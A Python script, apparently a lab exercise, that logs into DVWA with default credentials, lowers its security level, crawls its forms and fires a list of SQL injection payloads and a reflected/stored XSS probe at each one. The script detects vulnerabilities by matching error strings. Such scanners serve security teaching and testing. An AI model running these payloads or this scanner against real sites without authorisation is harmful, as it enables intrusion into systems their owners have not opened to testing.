import requests
import re
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin, urlparse
from pprint import pprint
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36"

payloads = ["' OR 1=1; --",
			"' OR '1'='1",
			"' or",
			"-- or",
			"' OR '1",
			"' OR 1 - - -",
			" OR ""= ",
			" OR 1 = 1 - - -",
			"' OR '' = '",
			"1' ORDER BY 1--+",
			"1' ORDER BY 2--+",
			"1' ORDER BY 3--+",
			"1' ORDER BY 1, 2--+",
			"1' ORDER BY 1, 2, 3--+",
			"1' GROUP BY 1, 2, --+",
			"1' GROUP BY 1, 2, 3--+",
			"' GROUP BY columnnames having 1= 1 - -",
			"-1' UNION SELECT 1, 2, 3--+",
			"OR 1 = 1",
			"OR 1 = 0",
			"OR 1= 1#",
			"OR 1 = 0#",
			"OR 1 = 1--",
			"OR 1= 0--",
			"HAVING 1 = 1",
			"HAVING 1= 0",
			"HAVING 1= 1#",
			"HAVING 1= 0#",
			"HAVING 1 = 1--",
			"HAVING 1 = 0--",
			"AND 1= 1",
			"AND 1= 0",
			"AND 1 = 1--",
			"AND 1 = 0--",
			"AND 1= 1#",
			"AND 1= 0#",
			"AND 1 = 1 AND '%' ='",
			"AND 1 = 0 AND '%' ='",
			"WHERE 1= 1 AND 1 = 1",
			"WHERE 1 = 1 AND 1 = 0",
			"WHERE 1 = 1 AND 1 = 1#",
			"WHERE 1 = 1 AND 1 = 0#",
			"WHERE 1 = 1 AND 1 = 1--",
			"WHERE 1 = 1 AND 1 = 0--",
			"ORDER BY 1--",
			"ORDER BY 2--",
			"ORDER BY 3--",
			"ORDER BY 4--",
			"ORDER BY 5--",
			"ORDER BY 6--",
			"ORDER BY 7--",
			"ORDER BY 8--",
			"ORDER BY 9--",
			"ORDER BY 10--",
			"ORDER BY 11--",
			"ORDER BY 12--",
			"ORDER BY 13--",
			"ORDER BY 14--",
			"ORDER BY 15--",
			"ORDER BY 16--",
			"ORDER BY 17--",
			"ORDER BY 18--",
			"ORDER BY 19--",
			"ORDER BY 20--",
			"ORDER BY 21--",
			"ORDER BY 22--",
			"ORDER BY 23--",
			"ORDER BY 24--",
			"ORDER BY 25--",
			"ORDER BY 26--",
			"ORDER BY 27--",
			"ORDER BY 28--",
			"ORDER BY 29--",
			"ORDER BY 30--",
			"ORDER BY 31337--",
			]
try:
	def set_security_level(start_url,level):
		login_payload = {
			"username": "admin",
			"password": "password",
			"Login": "Login",
		}
		#login_url = "http://10.10.48.63/DVWA/login.php"
		login_url = start_url + "login.php"

		r = s.get(login_url)
		token = re.search("user_token'\s*value='(.*?)'", r.text).group(1)
		login_payload['user_token'] = token
		response = s.post(login_url, data=login_payload)
		#print("Login Response:", response.text)

		#security_url = "http://10.10.48.63/DVWA/security.php"
		security_url = start_url+"security.php"
		response = s.get(security_url)
		#print("Security Page HTML:", response.text)

		soup = bs(response.content, 'html.parser')
		security_form = soup.find('form', {'action': '#'})

		if security_form:
			security_token = soup.find('input', {'name': 'user_token'}).get('value')
			security_payload = {
				'security': level, 
				'seclev_submit': 'Submit',
				'user_token': security_token
			}

			response = s.post(security_url, data=security_payload)
			#print("Security Level Set Response:", response.text)
		else:
			print("Security form not found on", security_url)


	def get_forms(url):
		forms = []
		response = s.get(url)
		soup = bs(response.content, "html.parser")
		for form in soup.find_all("form"):
			forms.append(form)
		return forms


	def get_form_details(form):
		details = {}
		try:
			action = form.attrs.get("action").lower()
		except:
			action = None
		method = form.attrs.get("method", "get").lower()
		inputs = []
		for input_tag in form.find_all("input"):
			input_type = input_tag.attrs.get("type", "text")
			input_name = input_tag.attrs.get("name")
			input_value = input_tag.attrs.get("value", "")
			inputs.append({"type": input_type, "name": input_name, "value": input_value})
		details["action"] = action
		details["method"] = method
		details["inputs"] = inputs
		return details


	visited_links = set()

	

	def is_vulnerable(response):
		errors = {
			"you have an error in your sql syntax;",
			"warning: mysql",
			"unclosed quotation mark after the character string",
			"quoted string not properly terminated",
		}
		for error in errors:
			if error in response.content.decode().lower():
				#print(response.content.decode().lower())
				return True
		return False

	def scan_sql_injection(url):
		forms = get_forms(url)
		print(f"\033[94m [+] Detected {len(forms)} forms on {url}.")
		for form in forms:
			form_details = get_form_details(form)
			for c in payloads:
				data = {}
				for input_tag in form_details["inputs"]:
					if input_tag["value"] or input_tag["type"] == "hidden":
						try:
							data[input_tag["name"]] = input_tag["value"] + c
						except:
							pass
					elif input_tag["type"] != "submit":
						data[input_tag["name"]] = f"test{c}"
				url = urljoin(url, form_details["action"])
				if form_details["method"] == "post":
					res = s.post(url, data=data)
				elif form_details["method"] == "get":
					res = s.get(url, params=data)
				if is_vulnerable(res):
					print("\033[92m [+] SQL Injection vulnerability detected, link:", url)
					print("\033[92m [+] Form:")
					pprint(form_details)
					break   

	def scan_xss_reflected(url):
		forms = get_forms(url)
		#print(f"\033[92m [+] Detected {len(forms)} forms on {url}.")
		for form in forms:
			form_details = get_form_details(form)
			for c in payloads:
				data = {}
				for input_tag in form_details["inputs"]:
					if input_tag["value"] or input_tag["type"] == "hidden":
						try:
							data[input_tag["name"]] = input_tag["value"] + c
						except:
							pass
					elif input_tag["type"] != "submit":
						data[input_tag["name"]] = f"<script>alert('XSS')</script>"
				url = urljoin(url, form_details["action"])
				if form_details["method"] == "post":
					res = s.post(url, data=data)
				elif form_details["method"] == "get":
					res = s.get(url, params=data)
				if "<script>alert('XSS')</script>" in res.text:
					print("\033[92m [+] Reflected XSS Vulnerability detected in form:", url)
					print("\033[92m [+] Form:")
					pprint(form_details)
					break

	def scan_xss_stored(url):
		xss_payload = "<script>alert('XSS')</script>"
		forms = get_forms(url)
		for form in forms:
			form_details = get_form_details(form)
			data = {}
			for input_tag in form_details["inputs"]:
				if input_tag["value"] or input_tag["type"] == "hidden":
					data[input_tag["name"]] = input_tag["value"]
				elif input_tag["type"] != "submit":
					data[input_tag["name"]] = xss_payload
			target_url = urljoin(url, form_details["action"])
			if form_details["method"] == "post":
				res=s.post(target_url, data=data)
			elif form_details["method"] == "get":
				res=s.get(target_url, params=data)

			res = s.get(url)
			if xss_payload in res.text:
				print("\033[92m [+] Stored XSS Vulnerability detected in form:", target_url)
				pprint(form_details)
				break

		
	
	def get_all_internal_forms(base_url):
		internal_forms = set()
		visited_urls = set()
		visited_urls.add(base_url+"logout.php")
		visited_urls.add(base_url+"login.php")
		visited_urls.add(base_url+"setup.php")
		visited_urls.add(base_url+"security.php")
		visited_urls.add(base_url+"vulnerabilities/csrf/")
		def recursive_form_search(current_url):
			if current_url in visited_urls:
				return 
			visited_urls.add(current_url)

			try:
				response = s.get(current_url)
				soup = bs(response.content, "html.parser")
            
				for form in soup.find_all("form"):
					action = form.attrs.get("action")
					absolute_action_url = urljoin(current_url, action)
					if urlparse(absolute_action_url).netloc == urlparse(base_url).netloc:
						internal_forms.add(absolute_action_url)
            
				for link in soup.find_all("a", href=True):
					href = urljoin(current_url, link["href"])
					if urlparse(href).netloc == urlparse(base_url).netloc:
						recursive_form_search(href)
			except Exception as e:
				print(f"Error processing {current_url}: {e}")

		recursive_form_search(base_url)
		return list(internal_forms)


	if __name__ == "__main__":
		start_url="http://10.10.48.63/DVWA/"
		#start_url="http://192.168.0.153/DVWA/"
		set_security_level(start_url,'low')
		internal_forms=get_all_internal_forms(start_url)
		print(internal_forms)
		for form_url in internal_forms:
			scan_sql_injection(form_url)
			scan_xss_reflected(form_url)
			scan_xss_stored(form_url)
except KeyboardInterrupt:
	print(" Exiting...")
